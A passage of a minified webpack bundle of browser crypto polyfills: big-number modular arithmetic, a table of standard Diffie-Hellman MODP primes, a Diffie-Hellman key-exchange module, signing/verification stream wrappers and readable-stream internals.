                    (Red.prototype.neg = function (a) {
                        return a.isZero() ? a.clone() : this.m.sub(a)._forceRed(this);
                    }),
                    (Red.prototype.add = function (a, b) {
                        this._verify2(a, b);
                        var res = a.add(b);
                        return res.cmp(this.m) >= 0 && res.isub(this.m), res._forceRed(this);
                    }),
                    (Red.prototype.iadd = function (a, b) {
                        this._verify2(a, b);
                        var res = a.iadd(b);
                        return res.cmp(this.m) >= 0 && res.isub(this.m), res;
                    }),
                    (Red.prototype.sub = function (a, b) {
                        this._verify2(a, b);
                        var res = a.sub(b);
                        return res.cmpn(0) < 0 && res.iadd(this.m), res._forceRed(this);
                    }),
                    (Red.prototype.isub = function (a, b) {
                        this._verify2(a, b);
                        var res = a.isub(b);
                        return res.cmpn(0) < 0 && res.iadd(this.m), res;
                    }),
                    (Red.prototype.shl = function (a, num) {
                        return this._verify1(a), this.imod(a.ushln(num));
                    }),
                    (Red.prototype.imul = function (a, b) {
                        return this._verify2(a, b), this.imod(a.imul(b));
                    }),
                    (Red.prototype.mul = function (a, b) {
                        return this._verify2(a, b), this.imod(a.mul(b));
                    }),
                    (Red.prototype.isqr = function (a) {
                        return this.imul(a, a.clone());
                    }),
                    (Red.prototype.sqr = function (a) {
                        return this.mul(a, a);
                    }),
                    (Red.prototype.sqrt = function (a) {
                        if (a.isZero()) return a.clone();
                        var mod3 = this.m.andln(3);
                        if ((assert(mod3 % 2 == 1), 3 === mod3)) {
                            var pow = this.m.add(new BN(1)).iushrn(2);
                            return this.pow(a, pow);
                        }
                        for (var q = this.m.subn(1), s = 0; !q.isZero() && 0 === q.andln(1); ) s++, q.iushrn(1);
                        assert(!q.isZero());
                        var one = new BN(1).toRed(this),
                            nOne = one.redNeg(),
                            lpow = this.m.subn(1).iushrn(1),
                            z = this.m.bitLength();
                        for (z = new BN(2 * z * z).toRed(this); 0 !== this.pow(z, lpow).cmp(nOne); ) z.redIAdd(nOne);
                        for (var c = this.pow(z, q), r = this.pow(a, q.addn(1).iushrn(1)), t = this.pow(a, q), m = s; 0 !== t.cmp(one); ) {
                            for (var tmp = t, i = 0; 0 !== tmp.cmp(one); i++) tmp = tmp.redSqr();
                            assert(i < m);
                            var b = this.pow(c, new BN(1).iushln(m - i - 1));
                            (r = r.redMul(b)), (c = b.redSqr()), (t = t.redMul(c)), (m = i);
                        }
                        return r;
                    }),
                    (Red.prototype.invm = function (a) {
                        var inv = a._invmp(this.m);
                        return 0 !== inv.negative ? ((inv.negative = 0), this.imod(inv).redNeg()) : this.imod(inv);
                    }),
                    (Red.prototype.pow = function (a, num) {
                        if (num.isZero()) return new BN(1).toRed(this);
                        if (0 === num.cmpn(1)) return a.clone();
                        var wnd = new Array(16);
                        (wnd[0] = new BN(1).toRed(this)), (wnd[1] = a);
                        for (var i = 2; i < wnd.length; i++) wnd[i] = this.mul(wnd[i - 1], a);
                        var res = wnd[0],
                            current = 0,
                            currentLen = 0,
                            start = num.bitLength() % 26;
                        for (0 === start && (start = 26), i = num.length - 1; i >= 0; i--) {
                            for (var word = num.words[i], j = start - 1; j >= 0; j--) {
                                var bit = (word >> j) & 1;
                                res !== wnd[0] && (res = this.sqr(res)),
                                    0 !== bit || 0 !== current ? ((current <<= 1), (current |= bit), (4 === ++currentLen || (0 === i && 0 === j)) && ((res = this.mul(res, wnd[current])), (currentLen = 0), (current = 0))) : (currentLen = 0);
                            }
                            start = 26;
                        }
                        return res;
                    }),
                    (Red.prototype.convertTo = function (num) {
                        var r = num.umod(this.m);
                        return r === num ? r.clone() : r;
                    }),
                    (Red.prototype.convertFrom = function (num) {
                        var res = num.clone();
                        return (res.red = null), res;
                    }),
                    (BN.mont = function (num) {
                        return new Mont(num);
                    }),
                    inherits(Mont, Red),
                    (Mont.prototype.convertTo = function (num) {
                        return this.imod(num.ushln(this.shift));
                    }),
                    (Mont.prototype.convertFrom = function (num) {
                        var r = this.imod(num.mul(this.rinv));
                        return (r.red = null), r;
                    }),
                    (Mont.prototype.imul = function (a, b) {
                        if (a.isZero() || b.isZero()) return (a.words[0] = 0), (a.length = 1), a;
                        var t = a.imul(b),
                            c = t.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),
                            u = t.isub(c).iushrn(this.shift),
                            res = u;
                        return u.cmp(this.m) >= 0 ? (res = u.isub(this.m)) : u.cmpn(0) < 0 && (res = u.iadd(this.m)), res._forceRed(this);
                    }),
                    (Mont.prototype.mul = function (a, b) {
                        if (a.isZero() || b.isZero()) return new BN(0)._forceRed(this);
                        var t = a.mul(b),
                            c = t.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),
                            u = t.isub(c).iushrn(this.shift),
                            res = u;
                        return u.cmp(this.m) >= 0 ? (res = u.isub(this.m)) : u.cmpn(0) < 0 && (res = u.iadd(this.m)), res._forceRed(this);
                    }),
                    (Mont.prototype.invm = function (a) {
                        return this.imod(a._invmp(this.m).mul(this.r2))._forceRed(this);
                    });
            })(module, this);
        }.call(this, __webpack_require__(23)(module)));
    },
    function (module, exports) {},
    function (module, exports) {},
    function (module) {
        module.exports = JSON.parse(
            '{"modp1":{"gen":"02","prime":"ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a63a3620ffffffffffffffff"},"modp2":{"gen":"02","prime":"ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece65381ffffffffffffffff"},"modp5":{"gen":"02","prime":"ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca237327ffffffffffffffff"},"modp14":{"gen":"02","prime":"ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca18217c32905e462e36ce3be39e772c180e86039b2783a2ec07a28fb5c55df06f4c52c9de2bcbf6955817183995497cea956ae515d2261898fa051015728e5a8aacaa68ffffffffffffffff"},"modp15":{"gen":"02","prime":"ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca18217c32905e462e36ce3be39e772c180e86039b2783a2ec07a28fb5c55df06f4c52c9de2bcbf6955817183995497cea956ae515d2261898fa051015728e5a8aaac42dad33170d04507a33a85521abdf1cba64ecfb850458dbef0a8aea71575d060c7db3970f85a6e1e4c7abf5ae8cdb0933d71e8c94e04a25619dcee3d2261ad2ee6bf12ffa06d98a0864d87602733ec86a64521f2b18177b200cbbe117577a615d6c770988c0bad946e208e24fa074e5ab3143db5bfce0fd108e4b82d120a93ad2caffffffffffffffff"},"modp16":{"gen":"02","prime":"ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca18217c32905e462e36ce3be39e772c180e86039b2783a2ec07a28fb5c55df06f4c52c9de2bcbf6955817183995497cea956ae515d2261898fa051015728e5a8aaac42dad33170d04507a33a85521abdf1cba64ecfb850458dbef0a8aea71575d060c7db3970f85a6e1e4c7abf5ae8cdb0933d71e8c94e04a25619dcee3d2261ad2ee6bf12ffa06d98a0864d87602733ec86a64521f2b18177b200cbbe117577a615d6c770988c0bad946e208e24fa074e5ab3143db5bfce0fd108e4b82d120a92108011a723c12a787e6d788719a10bdba5b2699c327186af4e23c1a946834b6150bda2583e9ca2ad44ce8dbbbc2db04de8ef92e8efc141fbecaa6287c59474e6bc05d99b2964fa090c3a2233ba186515be7ed1f612970cee2d7afb81bdd762170481cd0069127d5b05aa993b4ea988d8fddc186ffb7dc90a6c08f4df435c934063199ffffffffffffffff"},"modp17":{"gen":"02","prime":"ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca18217c32905e462e36ce3be39e772c180e86039b2783a2ec07a28fb5c55df06f4c52c9de2bcbf6955817183995497cea956ae515d2261898fa051015728e5a8aaac42dad33170d04507a33a85521abdf1cba64ecfb850458dbef0a8aea71575d060c7db3970f85a6e1e4c7abf5ae8cdb0933d71e8c94e04a25619dcee3d2261ad2ee6bf12ffa06d98a0864d87602733ec86a64521f2b18177b200cbbe117577a615d6c770988c0bad946e208e24fa074e5ab3143db5bfce0fd108e4b82d120a92108011a723c12a787e6d788719a10bdba5b2699c327186af4e23c1a946834b6150bda2583e9ca2ad44ce8dbbbc2db04de8ef92e8efc141fbecaa6287c59474e6bc05d99b2964fa090c3a2233ba186515be7ed1f612970cee2d7afb81bdd762170481cd0069127d5b05aa993b4ea988d8fddc186ffb7dc90a6c08f4df435c93402849236c3fab4d27c7026c1d4dcb2602646dec9751e763dba37bdf8ff9406ad9e530ee5db382f413001aeb06a53ed9027d831179727b0865a8918da3edbebcf9b14ed44ce6cbaced4bb1bdb7f1447e6cc254b332051512bd7af426fb8f401378cd2bf5983ca01c64b92ecf032ea15d1721d03f482d7ce6e74fef6d55e702f46980c82b5a84031900b1c9e59e7c97fbec7e8f323a97a7e36cc88be0f1d45b7ff585ac54bd407b22b4154aacc8f6d7ebf48e1d814cc5ed20f8037e0a79715eef29be32806a1d58bb7c5da76f550aa3d8a1fbff0eb19ccb1a313d55cda56c9ec2ef29632387fe8d76e3c0468043e8f663f4860ee12bf2d5b0b7474d6e694f91e6dcc4024ffffffffffffffff"},"modp18":{"gen":"02","prime":"ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca18217c32905e462e36ce3be39e772c180e86039b2783a2ec07a28fb5c55df06f4c52c9de2bcbf6955817183995497cea956ae515d2261898fa051015728e5a8aaac42dad33170d04507a33a85521abdf1cba64ecfb850458dbef0a8aea71575d060c7db3970f85a6e1e4c7abf5ae8cdb0933d71e8c94e04a25619dcee3d2261ad2ee6bf12ffa06d98a0864d87602733ec86a64521f2b18177b200cbbe117577a615d6c770988c0bad946e208e24fa074e5ab3143db5bfce0fd108e4b82d120a92108011a723c12a787e6d788719a10bdba5b2699c327186af4e23c1a946834b6150bda2583e9ca2ad44ce8dbbbc2db04de8ef92e8efc141fbecaa6287c59474e6bc05d99b2964fa090c3a2233ba186515be7ed1f612970cee2d7afb81bdd762170481cd0069127d5b05aa993b4ea988d8fddc186ffb7dc90a6c08f4df435c93402849236c3fab4d27c7026c1d4dcb2602646dec9751e763dba37bdf8ff9406ad9e530ee5db382f413001aeb06a53ed9027d831179727b0865a8918da3edbebcf9b14ed44ce6cbaced4bb1bdb7f1447e6cc254b332051512bd7af426fb8f401378cd2bf5983ca01c64b92ecf032ea15d1721d03f482d7ce6e74fef6d55e702f46980c82b5a84031900b1c9e59e7c97fbec7e8f323a97a7e36cc88be0f1d45b7ff585ac54bd407b22b4154aacc8f6d7ebf48e1d814cc5ed20f8037e0a79715eef29be32806a1d58bb7c5da76f550aa3d8a1fbff0eb19ccb1a313d55cda56c9ec2ef29632387fe8d76e3c0468043e8f663f4860ee12bf2d5b0b7474d6e694f91e6dbe115974a3926f12fee5e438777cb6a932df8cd8bec4d073b931ba3bc832b68d9dd300741fa7bf8afc47ed2576f6936ba424663aab639c5ae4f5683423b4742bf1c978238f16cbe39d652de3fdb8befc848ad922222e04a4037c0713eb57a81a23f0c73473fc646cea306b4bcbc8862f8385ddfa9d4b7fa2c087e879683303ed5bdd3a062b3cf5b3a278a66d2a13f83f44f82ddf310ee074ab6a364597e899a0255dc164f31cc50846851df9ab48195ded7ea1b1d510bd7ee74d73faf36bc31ecfa268359046f4eb879f924009438b481c6cd7889a002ed5ee382bc9190da6fc026e479558e4475677e9aa9e3050e2765694dfc81f56e880b96e7160c980dd98edd3dfffffffffffffffff"}}'
        );
    },
    function (module, exports, __webpack_require__) {
        (function (Buffer) {
            var BN = __webpack_require__(111),
                millerRabin = new (__webpack_require__(112))(),
                TWENTYFOUR = new BN(24),
                ELEVEN = new BN(11),
                TEN = new BN(10),
                THREE = new BN(3),
                SEVEN = new BN(7),
                primes = __webpack_require__(110),
                randomBytes = __webpack_require__(24);
            function setPublicKey(pub, enc) {
                return (enc = enc || "utf8"), Buffer.isBuffer(pub) || (pub = new Buffer(pub, enc)), (this._pub = new BN(pub)), this;
            }
            function setPrivateKey(priv, enc) {
                return (enc = enc || "utf8"), Buffer.isBuffer(priv) || (priv = new Buffer(priv, enc)), (this._priv = new BN(priv)), this;
            }
            module.exports = DH;
            var primeCache = {};
            function DH(prime, generator, malleable) {
                this.setGenerator(generator),
                    (this.__prime = new BN(prime)),
                    (this._prime = BN.mont(this.__prime)),
                    (this._primeLen = prime.length),
                    (this._pub = void 0),
                    (this._priv = void 0),
                    (this._primeCode = void 0),
                    malleable ? ((this.setPublicKey = setPublicKey), (this.setPrivateKey = setPrivateKey)) : (this._primeCode = 8);
            }
            function formatReturnValue(bn, enc) {
                var buf = new Buffer(bn.toArray());
                return enc ? buf.toString(enc) : buf;
            }
            Object.defineProperty(DH.prototype, "verifyError", {
                enumerable: !0,
                get: function () {
                    return (
                        "number" != typeof this._primeCode &&
                            (this._primeCode = (function (prime, generator) {
                                var gen = generator.toString("hex"),
                                    hex = [gen, prime.toString(16)].join("_");
                                if (hex in primeCache) return primeCache[hex];
                                var rem,
                                    error = 0;
                                if (prime.isEven() || !primes.simpleSieve || !primes.fermatTest(prime) || !millerRabin.test(prime)) return (error += 1), (error += "02" === gen || "05" === gen ? 8 : 4), (primeCache[hex] = error), error;
                                switch ((millerRabin.test(prime.shrn(1)) || (error += 2), gen)) {
                                    case "02":
                                        prime.mod(TWENTYFOUR).cmp(ELEVEN) && (error += 8);
                                        break;
                                    case "05":
                                        (rem = prime.mod(TEN)).cmp(THREE) && rem.cmp(SEVEN) && (error += 8);
                                        break;
                                    default:
                                        error += 4;
                                }
                                return (primeCache[hex] = error), error;
                            })(this.__prime, this.__gen)),
                        this._primeCode
                    );
                },
            }),
                (DH.prototype.generateKeys = function () {
                    return this._priv || (this._priv = new BN(randomBytes(this._primeLen))), (this._pub = this._gen.toRed(this._prime).redPow(this._priv).fromRed()), this.getPublicKey();
                }),
                (DH.prototype.computeSecret = function (other) {
                    var secret = (other = (other = new BN(other)).toRed(this._prime)).redPow(this._priv).fromRed(),
                        out = new Buffer(secret.toArray()),
                        prime = this.getPrime();
                    if (out.length < prime.length) {
                        var front = new Buffer(prime.length - out.length);
                        front.fill(0), (out = Buffer.concat([front, out]));
                    }
                    return out;
                }),
                (DH.prototype.getPublicKey = function (enc) {
                    return formatReturnValue(this._pub, enc);
                }),
                (DH.prototype.getPrivateKey = function (enc) {
                    return formatReturnValue(this._priv, enc);
                }),
                (DH.prototype.getPrime = function (enc) {
                    return formatReturnValue(this.__prime, enc);
                }),
                (DH.prototype.getGenerator = function (enc) {
                    return formatReturnValue(this._gen, enc);
                }),
                (DH.prototype.setGenerator = function (gen, enc) {
                    return (enc = enc || "utf8"), Buffer.isBuffer(gen) || (gen = new Buffer(gen, enc)), (this.__gen = gen), (this._gen = new BN(gen)), this;
                });
        }.call(this, __webpack_require__(6).Buffer));
    },
    function (module, exports, __webpack_require__) {
        var Buffer = __webpack_require__(55).Buffer,
            createHash = __webpack_require__(33),
            stream = __webpack_require__(241),
            inherits = __webpack_require__(3),
            sign = __webpack_require__(249),
            verify = __webpack_require__(280),
            algorithms = __webpack_require__(97);
        function Sign(algorithm) {
            stream.Writable.call(this);
            var data = algorithms[algorithm];
            if (!data) throw new Error("Unknown message digest");
            (this._hashType = data.hash), (this._hash = createHash(data.hash)), (this._tag = data.id), (this._signType = data.sign);
        }
        function Verify(algorithm) {
            stream.Writable.call(this);
            var data = algorithms[algorithm];
            if (!data) throw new Error("Unknown message digest");
            (this._hash = createHash(data.hash)), (this._tag = data.id), (this._signType = data.sign);
        }
        function createSign(algorithm) {
            return new Sign(algorithm);
        }
        function createVerify(algorithm) {
            return new Verify(algorithm);
        }
        Object.keys(algorithms).forEach(function (key) {
            (algorithms[key].id = Buffer.from(algorithms[key].id, "hex")), (algorithms[key.toLowerCase()] = algorithms[key]);
        }),
            inherits(Sign, stream.Writable),
            (Sign.prototype._write = function (data, _, done) {
                this._hash.update(data), done();
            }),
            (Sign.prototype.update = function (data, enc) {
                return "string" == typeof data && (data = Buffer.from(data, enc)), this._hash.update(data), this;
            }),
            (Sign.prototype.sign = function (key, enc) {
                this.end();
                var hash = this._hash.digest(),
                    sig = sign(hash, key, this._hashType, this._signType, this._tag);
                return enc ? sig.toString(enc) : sig;
            }),
            inherits(Verify, stream.Writable),
            (Verify.prototype._write = function (data, _, done) {
                this._hash.update(data), done();
            }),
            (Verify.prototype.update = function (data, enc) {
                return "string" == typeof data && (data = Buffer.from(data, enc)), this._hash.update(data), this;
            }),
            (Verify.prototype.verify = function (key, sig, enc) {
                "string" == typeof sig && (sig = Buffer.from(sig, enc)), this.end();
                var hash = this._hash.digest();
                return verify(sig, hash, key, this._signType, this._tag);
            }),
            (module.exports = { Sign: createSign, Verify: createVerify, createSign: createSign, createVerify: createVerify });
    },
    function (module, exports, __webpack_require__) {
        ((exports = module.exports = __webpack_require__(113)).Stream = exports),
            (exports.Readable = exports),
            (exports.Writable = __webpack_require__(117)),
            (exports.Duplex = __webpack_require__(29)),
            (exports.Transform = __webpack_require__(118)),
            (exports.PassThrough = __webpack_require__(247)),
            (exports.finished = __webpack_require__(56)),
            (exports.pipeline = __webpack_require__(248));
    },
    function (module, exports) {},
    function (module, exports, __webpack_require__) {
        "use strict";
        function ownKeys(object, enumerableOnly) {
            var keys = Object.keys(object);
            if (Object.getOwnPropertySymbols) {
                var symbols = Object.getOwnPropertySymbols(object);
                enumerableOnly &&
                    (symbols = symbols.filter(function (sym) {
                        return Object.getOwnPropertyDescriptor(object, sym).enumerable;
                    })),
                    keys.push.apply(keys, symbols);
            }
            return keys;
        }
        function _defineProperty(obj, key, value) {
            return key in obj ? Object.defineProperty(obj, key, { value: value, enumerable: !0, configurable: !0, writable: !0 }) : (obj[key] = value), obj;
        }
        function _defineProperties(target, props) {
            for (var i = 0; i < props.length; i++) {
                var descriptor = props[i];
                (descriptor.enumerable = descriptor.enumerable || !1), (descriptor.configurable = !0), "value" in descriptor && (descriptor.writable = !0), Object.defineProperty(target, descriptor.key, descriptor);
            }
        }
        var Buffer = __webpack_require__(6).Buffer,
            inspect = __webpack_require__(244).inspect,
            custom = (inspect && inspect.custom) || "inspect";
        module.exports = (function () {
            function BufferList() {
                !(function (instance, Constructor) {
                    if (!(instance instanceof Constructor)) throw new TypeError("Cannot call a class as a function");
                })(this, BufferList),
                    (this.head = null),
                    (this.tail = null),
                    (this.length = 0);
            }
            var Constructor, protoProps, staticProps;
            return (
                (Constructor = BufferList),
                (protoProps = [
                    {
                        key: "push",
                        value: function (v) {
                            var entry = { data: v, next: null };
                            this.length > 0 ? (this.tail.next = entry) : (this.head = entry), (this.tail = entry), ++this.length;
                        },
                    },
                    {
                        key: "unshift",
                        value: function (v) {
                            var entry = { data: v, next: this.head };
                            0 === this.length && (this.tail = entry), (this.head = entry), ++this.length;
                        },
                    },
                    {
                        key: "shift",
                        value: function () {
                            if (0 !== this.length) {
                                var ret = this.head.data;
                                return 1 === this.length ? (this.head = this.tail = null) : (this.head = this.head.next), --this.length, ret;
                            }
                        },
                    },
                    {
                        key: "clear",
                        value: function () {
                            (this.head = this.tail = null), (this.length = 0);
                        },
                    },
                    {
                        key: "join",
                        value: function (s) {
                            if (0 === this.length) return "";
                            for (var p = this.head, ret = "" + p.data; (p = p.next); ) ret += s + p.data;
                            return ret;
                        },
                    },
                    {
                        key: "concat",
                        value: function (n) {
                            if (0 === this.length) return Buffer.alloc(0);
                            for (var src, target, offset, ret = Buffer.allocUnsafe(n >>> 0), p = this.head, i = 0; p; )
                                (src = p.data), (target = ret), (offset = i), Buffer.prototype.copy.call(src, target, offset), (i += p.data.length), (p = p.next);
                            return ret;
                        },
                    },
                    {
                        key: "consume",
                        value: function (n, hasStrings) {
                            var ret;
                            return (
                                n < this.head.data.length
                                    ? ((ret = this.head.data.slice(0, n)), (this.head.data = this.head.data.slice(n)))
                                    : (ret = n === this.head.data.length ? this.shift() : hasStrings ? this._getString(n) : this._getBuffer(n)),
                                ret
                            );
                        },
                    },
                    {
                        key: "first",
                        value: function () {
                            return this.head.data;
                        },
                    },
                    {
                        key: "_getString",
                        value: function (n) {
                            var p = this.head,
                                c = 1,
                                ret = p.data;
                            for (n -= ret.length; (p = p.next); ) {
                                var str = p.data,
                                    nb = n > str.length ? str.length : n;
                                if ((nb === str.length ? (ret += str) : (ret += str.slice(0, n)), 0 == (n -= nb))) {
                                    nb === str.length ? (++c, p.next ? (this.head = p.next) : (this.head = this.tail = null)) : ((this.head = p), (p.data = str.slice(nb)));
                                    break;
                                }
                                ++c;
                            }
                            return (this.length -= c), ret;
                        },
                    },
                    {
                        key: "_getBuffer",
                        value: function (n) {
                            var ret = Buffer.allocUnsafe(n),
                                p = this.head,
                                c = 1;
                            for (p.data.copy(ret), n -= p.data.length; (p = p.next); ) {
                                var buf = p.data,
                                    nb = n > buf.length ? buf.length : n;
                                if ((buf.copy(ret, ret.length - n, 0, nb), 0 == (n -= nb))) {
                                    nb === buf.length ? (++c, p.next ? (this.head = p.next) : (this.head = this.tail = null)) : ((this.head = p), (p.data = buf.slice(nb)));
                                    break;
                                }
                                ++c;
                            }
                            return (this.length -= c), ret;
                        },
                    },
                    {
                        key: custom,
                        value: function (_, options) {
                            return inspect(
                                this,
                                (function (target) {
                                    for (var i = 1; i < arguments.length; i++) {
                                        var source = null != arguments[i] ? arguments[i] : {};
                                        i % 2
                                            ? ownKeys(Object(source), !0).forEach(function (key) {
                                                  _defineProperty(target, key, source[key]);
                                              })
                                            : Object.getOwnPropertyDescriptors
                                            ? Object.defineProperties(target, Object.getOwnPropertyDescriptors(source))
                                            : ownKeys(Object(source)).forEach(function (key) {
                                                  Object.defineProperty(target, key, Object.getOwnPropertyDescriptor(source, key));
                                              });
                                    }
                                    return target;
                                })({}, options, { depth: 0, customInspect: !1 })
                            );
                        },
                    },
                ]) && _defineProperties(Constructor.prototype, protoProps),
                staticProps && _defineProperties(Constructor, staticProps),
                BufferList
            );
        })();
    },
    function (module, exports) {},
    function (module, exports, __webpack_require__) {
        "use strict";
        (function (process) {
            var _Object$setPrototypeO;
            function _defineProperty(obj, key, value) {
                return key in obj ? Object.defineProperty(obj, key, { value: value, enumerable: !0, configurable: !0, writable: !0 }) : (obj[key] = value), obj;
            }
            var finished = __webpack_require__(56),
                kLastResolve = Symbol("lastResolve"),
                kLastReject = Symbol("lastReject"),
                kError = Symbol("error"),
                kEnded = Symbol("ended"),
                kLastPromise = Symbol("lastPromise"),
                kHandlePromise = Symbol("handlePromise"),
                kStream = Symbol("stream");
            function createIterResult(value, done) {
                return { value: value, done: done };
            }
            function readAndResolve(iter) {
                var resolve = iter[kLastResolve];
                if (null !== resolve) {
                    var data = iter[kStream].read();
                    null !== data && ((iter[kLastPromise] = null), (iter[kLastResolve] = null), (iter[kLastReject] = null), resolve(createIterResult(data, !1)));
                }
            }
            function onReadable(iter) {
                process.nextTick(readAndResolve, iter);
            }
            var AsyncIteratorPrototype = Object.getPrototypeOf(function () {}),
                ReadableStreamAsyncIteratorPrototype = Object.setPrototypeOf(
                    (_defineProperty(
                        (_Object$setPrototypeO = {
                            get stream() {
                                return this[kStream];
                            },
                            next: function () {
                                var _this = this,
                                    error = this[kError];
                                if (null !== error) return Promise.reject(error);
                                if (this[kEnded]) return Promise.resolve(createIterResult(void 0, !0));
                                if (this[kStream].destroyed)
                                    return new Promise(function (resolve, reject) {
                                        process.nextTick(function () {
                                            _this[kError] ? reject(_this[kError]) : resolve(createIterResult(void 0, !0));
                                        });
                                    });
                                var promise,
                                    lastPromise = this[kLastPromise];
                                if (lastPromise)
                                    promise = new Promise(
                                        (function (lastPromise, iter) {
                                            return function (resolve, reject) {
                                                lastPromise.then(function () {
                                                    iter[kEnded] ? resolve(createIterResult(void 0, !0)) : iter[kHandlePromise](resolve, reject);
                                                }, reject);
                                            };
                                        })(lastPromise, this)
                                    );
                                else {
                                    var data = this[kStream].read();
                                    if (null !== data) return Promise.resolve(createIterResult(data, !1));
                                    promise = new Promise(this[kHandlePromise]);
                                }
                                return (this[kLastPromise] = promise), promise;
                            },
                        }),
                        Symbol.asyncIterator,
                        function () {
                            return this;
                        }
                    ),
                    _defineProperty(_Object$setPrototypeO, "return", function () {
                        var _this2 = this;
                        return new Promise(function (resolve, reject) {
                            _this2[kStream].destroy(null, function (err) {
                                err ? reject(err) : resolve(createIterResult(void 0, !0));
                            });
                        });
                    }),
                    _Object$setPrototypeO),
                    AsyncIteratorPrototype
                );
            module.exports = function (stream) {
                var _Object$create,
                    iterator = Object.create(
                        ReadableStreamAsyncIteratorPrototype,
                        (_defineProperty((_Object$create = {}), kStream, { value: stream, writable: !0 }),
                        _defineProperty(_Object$create, kLastResolve, { value: null, writable: !0 }),
                        _defineProperty(_Object$create, kLastReject, { value: null, writable: !0 }),
                        _defineProperty(_Object$create, kError, { value: null, writable: !0 }),
                        _defineProperty(_Object$create, kEnded, { value: stream._readableState.endEmitted, writable: !0 }),
                        _defineProperty(_Object$create, kHandlePromise, {
                            value: function (resolve, reject) {
                                var data = iterator[kStream].read();
                                data
                                    ? ((iterator[kLastPromise] = null), (iterator[kLastResolve] = null), (iterator[kLastReject] = null), resolve(createIterResult(data, !1)))
                                    : ((iterator[kLastResolve] = resolve), (iterator[kLastReject] = reject));
                            },
                            writable: !0,
                        }),
                        _Object$create)
                    );
                return (
                    (iterator[kLastPromise] = null),
                    finished(stream, function (err) {
                        if (err && "ERR_STREAM_PREMATURE_CLOSE" !== err.code) {
                            var reject = iterator[kLastReject];
                            return null !== reject && ((iterator[kLastPromise] = null), (iterator[kLastResolve] = null), (iterator[kLastReject] = null), reject(err)), void (iterator[kError] = err);
                        }
                        var resolve = iterator[kLastResolve];
                        null !== resolve && ((iterator[kLastPromise] = null), (iterator[kLastResolve] = null), (iterator[kLastReject] = null), resolve(createIterResult(void 0, !0))), (iterator[kEnded] = !0);
                    }),
                    stream.on("readable", onReadable.bind(null, iterator)),
                    iterator
                );
            };
        }.call(this, __webpack_require__(7)));
    },
    function (module, exports) {
        module.exports = function () {
            throw new Error("Readable.from is not available in the browser");
        };
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        module.exports = PassThrough;
        var Transform = __webpack_require__(118);
        function PassThrough(options) {
            if (!(this instanceof PassThrough)) return new PassThrough(options);
            Transform.call(this, options);
        }
        __webpack_require__(3)(PassThrough, Transform),
            (PassThrough.prototype._transform = function (chunk, encoding, cb) {
                cb(null, chunk);
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var eos;
        var _require$codes = __webpack_require__(28).codes,
            ERR_MISSING_ARGS = _require$codes.ERR_MISSING_ARGS,
            ERR_STREAM_DESTROYED = _require$codes.ERR_STREAM_DESTROYED;
        function noop(err) {
            if (err) throw err;
        }
        function destroyer(stream, reading, writing, callback) {
            callback = (function (callback) {
                var called = !1;
                return function () {
                    called || ((called = !0), callback.apply(void 0, arguments));
                };
            })(callback);
            var closed = !1;
            stream.on("close", function () {
                closed = !0;
            }),
                void 0 === eos && (eos = __webpack_require__(56)),
                eos(stream, { readable: reading, writable: writing }, function (err) {
                    if (err) return callback(err);
                    (closed = !0), callback();
                });
            var destroyed = !1;
            return function (err) {
                if (!closed && !destroyed)
                    return (
                        (destroyed = !0),
                        (function (stream) {
                            return stream.setHeader && "function" == typeof stream.abort;
